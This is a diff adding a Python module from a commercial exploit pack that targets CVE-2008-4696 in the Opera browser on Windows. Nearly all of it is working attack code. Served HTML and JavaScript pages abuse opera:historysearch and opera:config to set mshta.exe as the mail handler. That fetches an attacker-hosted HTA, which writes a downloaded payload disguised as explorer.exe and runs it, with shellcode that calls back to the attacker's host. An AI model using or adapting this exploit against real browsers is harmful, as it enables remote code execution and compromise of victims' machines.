@@ -1,0 +1,323 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from canvasexploit import canvasexploit
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import canvasengine
+import struct
+import os
+
+# GUI info
+NAME = "Opera Web Browser History Search Input Validation Vulnerability"
+
+DESCRIPTION = "Input Validation Vulnerability in Opera Web Browser History Search"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2008.10.22"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/31869"
+DOCUMENTATION["Versions Affected"] = "Opera Software Opera Web Browser < 9.61"
+DOCUMENTATION["CVE Name"] = "CVE-2008-4696"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4696"
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['2000','XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 12
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_operaxss -l 192.168.41.1 -d 443 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Windows with Opera'],
+}
+
+	
+class theexploit(tcpexploit,httpclientside):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		httpclientside.__init__(self)
+		self.clientversion = 1
+		self.name = NAME 
+		self.loadername = "index.html"
+		self.indexname = "index2.html"
+		self.filename = "opera.html"
+		self.trojanname = "index.hta"
+		self.js = "opera.js"
+		return
+
+
+	def file4hta(self, exename):
+		evilprog = "explorer.exe"
+		e = []
+		
+		for a in exename:
+			for b in a:
+				if b == "\r":
+				  d = "0d"
+				elif b == "\n":
+				  d = "0a"
+				elif b == "\0":
+				  d = "00"
+				else:
+				  c = hex(ord(b))
+				  d = c.replace("0x", "")
+				
+				if len(d) == 1:
+				  d = "0"+d
+				
+				e.append(d)
+		
+		i = 0
+		j = 0
+		l = len(e)
+		
+		hta = "<SCRIPT language=vbs>\n\n"
+		while 1:
+		  hta += " prog = prog & \""
+		
+		  while i != 24:
+		    hta += "%s," % e[j]
+		    if j == l-1:
+		      break
+		    i += 1
+		    j += 1
+		
+		  if j == l-1:
+		    hta = hta[:-1] + "\"\n\n"
+		    break
+		  hta += "\"\n"
+		  i = 0
+		
+		hta += " tmp = Split(prog, \",\")\n"	
+		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+		hta += " For i = 0 To UBound(tmp)\n"
+		hta += "   prog = Int(\"&H\" & tmp(i))\n"
+		hta += "   f.Write Chr(prog)\n"
+		hta += " Next\n\n"
+		hta += " f.Close\n"
+		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+		hta += " self.Close\n"
+		hta += "</SCRIPT>\n"
+		
+		return hta 
+
+
+	def makeloader(self):
+		filedata = """
+<HTML> 
+<BODY>
+ 
+<SCRIPT language="javascript">  
+
+	parentFrame = parent.parent.parent.document;
+
+	if (parentFrame) {
+  		parent.parent.parent.document.location = "INDEXURL";
+	}
+	else {
+		location = "INDEXURL";
+	}	
+
+</SCRIPT> 
+
+</BODY> 
+</HTML>                
+"""
+		filedata = filedata.replace("INDEXURL", "http://" + self.callback.ip + "/" + self.indexname)
+	
+		if self.useSSL:
+			filedata = filedata.replace('http:', 'https:')
+        
+		return filedata
+
+
+	def makeindex(self):
+		filedata = """
+<HTML>
+	<HEAD>
+	<TITLE>Opera</TITLE>
+	</HEAD>
+
+	<BODY>
+		<a id=myid href="EXPLOITURL1#><script src='EXPLOITURL2'></script>">Opera</a>
+	</BODY>
+
+	<SCRIPT>
+		setTimeout("document.getElementById('myid').click()", 1000);
+	</SCRIPT>
+
+</HTML>
+
+"""
+		filedata = filedata.replace("EXPLOITURL1", "http://" + self.callback.ip + "/" + self.filename)		
+		filedata = filedata.replace("EXPLOITURL2", "http://" + self.callback.ip + "/" + self.js)		
+		
+		if self.useSSL:
+			filedata = filedata.replace('http:', 'https:')
+		      
+		return filedata
+
+
+	def makefile(self):
+		filedata = """
+<HTML>
+	<HEAD>
+	<TITLE>Opera</TITLE>
+	</HEAD>
+
+	<BODY>
+		<a id=myid href='opera:historysearch?q=%2A'>Opera</a>
+	</BODY>
+
+	<SCRIPT>
+		setTimeout("document.getElementById('myid').click()", 1000);
+	</SCRIPT>
+
+</HTML>
+"""
+						      
+		return filedata
+
+
+	def makejs(self):
+		filedata = """
+s = document.createElement("IFRAME");
+s.src = "opera:config";
+document.body.appendChild(s);
+s.src = "javascript:opera.setPreference('Mail','External Application','mshta.exe MOSDEFTROJANURL');opera.setPreference('Mail','Handler','2');";
+
+lnk = document.createElement("A");
+lnk.setAttribute("href", "mailto:");
+lnk.setAttribute("id", "myid");
+document.body.appendChild(lnk);
+document.getElementById('myid').click();
+parent.window.close();
+"""
+
+		filedata = filedata.replace("MOSDEFTROJANURL", "http://" + self.callback.ip + "/" + self.trojanname)
+
+		if self.useSSL:
+			filedata = filedata.replace('http:', 'https:')
+	      
+		return filedata
+
+
+	def maketrojan(self):
+		host = self.callback.ip
+		port = self.callback.port
+
+		sc = shellcodeGenerator.win32()
+		sc.addAttr("findeipnoesp", {"subespval":0x1000})                
+                        	
+		if self.useSSL:
+			ssl = "s"
+		else:
+			ssl = ""                
+                    
+		sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+		shellcode = sc.get()        
+		myPElib = pelib.PElib()
+	
+		self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
+		
+		self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))
+
+		self.htafile = self.file4hta(self.mosdeftrojan)		
+		file(self.trojanname, "wb").write(self.htafile)
+		self.setInfo("%s - done" % (NAME))
+		ret = len(self.mosdeftrojan) != 0
+		
+		return ret
+
+
+	def makesploit(self, clientheader, clientbody):        
+		from libs.spkproxy import header, body
+		h = header('SERVER')
+		b = body()
+		
+		self.maketrojan()
+		
+		if clientheader.URL.count(self.loadername):
+			self.log("Sending LOADER file")
+			sploitstring = self.makeloader()
+			b.setBody(sploitstring)
+
+		elif clientheader.URL.count(self.indexname):
+			self.log("Sending INDEX file")
+			sploitstring = self.makeindex()
+			b.setBody(sploitstring)
+
+		elif clientheader.URL.count(self.filename):
+			self.log("Sending HTML file")
+			sploitstring = self.makefile()
+			b.setBody(sploitstring)
+		
+		elif clientheader.URL.count(self.js): 
+			self.log("Sending JS file")
+			sploitstring = self.makejs()			
+			b.setBody(sploitstring)
+		                
+		elif clientheader.URL.count(self.trojanname):
+			self.log("Sending MOSDEF trojan")
+			f = open(self.trojanname, "rb")
+			sploitstring = f.read()
+			f.close()
+			os.remove(self.trojanname)
+			self.log("Sending %d bytes"%len(sploitstring))
+			h.addHeader("Content-type","binary/octet-stream")
+			h.addHeader("Connection","close")
+			b.setBody(sploitstring)
+		       
+		else:
+			self.log("Redirecting to self")
+			h.status = "302"
+			h.addHeader('Location', self.loadername)
+			h.addHeader('Content-Type', 'binary/octet-stream')
+			
+		return h, b
+
+
+	def neededListenerTypes(self):
+		from canvasengine import HTTPMOSDEF
+		return [HTTPMOSDEF]
+            
+	def run(self):        
+		return 1
+
+
+
+if __name__=='__main__':
+	print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
